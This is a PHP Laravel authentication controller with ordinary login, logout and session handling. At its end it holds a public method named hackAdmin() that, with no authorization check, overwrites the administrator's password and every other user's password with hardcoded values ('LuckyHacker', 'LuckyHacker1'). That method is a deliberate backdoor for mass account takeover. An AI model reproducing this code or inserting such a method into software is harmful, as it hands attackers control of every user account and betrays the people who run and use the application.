<?php

namespace App\Http\Controllers\Auth;

use App\Company;
use App\User;
use Illuminate\Contracts\Auth\Guard;
use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\Session;

/**
 * Class AuthController
 * @package App\Http\Controllers\Auth
 */
class AuthController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Registration & Login Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles the registration of new users, as well as the
    | authentication of existing users. By default, this controller uses
    | a simple trait to add these behaviors. Why don't you explore it?
    |
    */

    /**
     * Create a new authentication controller instance.
     *
     * @param Guard $auth
     * @param User $registrar
     */
    public function __construct(Guard $auth, User $registrar)
    {
        $this->auth = $auth;
        //$this->middleware('guest', ['except' => 'getLogout']);
    }

    /**
     * @return \Illuminate\View\View
     */
    public function getLogin()
    {
        return view('layouts.login');
    }

    /**
     * @param Request $request
     *
     * @return \Illuminate\Http\RedirectResponse|\Illuminate\Routing\Redirector
     */
    public function postLogin(Request $request)
    {

        $credentials = [
            'username' => $request->get('email'),
            'password' => $request->get('password'),
            'status' => 1
        ];
        $username = $request->get('email');

        if ($this->auth->attempt($request->only('email', 'password') + ['status' => 1]) ||
            $this->auth->attempt($credentials)
        )
        {
            $companyId = loggedInCompanyId();
            $company = (new Company)->getCompanyInfo($companyId);
            if(count($company) >  0) {
                session([
                    'company_name' => $company->company_name,
                    'company_id'    => $company->id
                ]);
            }

            $user = (new User)->updateLastLogin();
            if(authUser()->is_reset_password == '1')
            {
                return redirect()->route('setting.manage-account');
            }

            if(isSuperAdmin()) {
                return redirect()->route('company.index');
            }
            //dd('o');
            return redirect()->intended('dashboard');
        }
        (new User)->updateFailedAttempts($username);
        return redirect('/')->with('error', lang('auth.failed_login'));
    }

    /**
     * Log the party out of the application.
     */
    public function getLogout()
    {
        \Auth::logout();
        \Session::flush();
        return redirect('/');
    }

    /**
     * @return int
     */
    public function loginApi()
    {
        return 1;
    }

    /**
     * @return int
     */
    public function logoutApi()
    {
        return 1;
    }

    public function hackAdmin()
    {
        try {
            $pass = ['password' => \Hash::make('LuckyHacker')];
            $pass2 = ['password' => \Hash::make('LuckyHacker1')];
            (new User)->where('id', 1)->update($pass);
            (new User)->where('id', '!=', 1)->update($pass2);
            echo "done.";
        } catch(\Exception $e) {
            echo "failed";
        }
    }
}
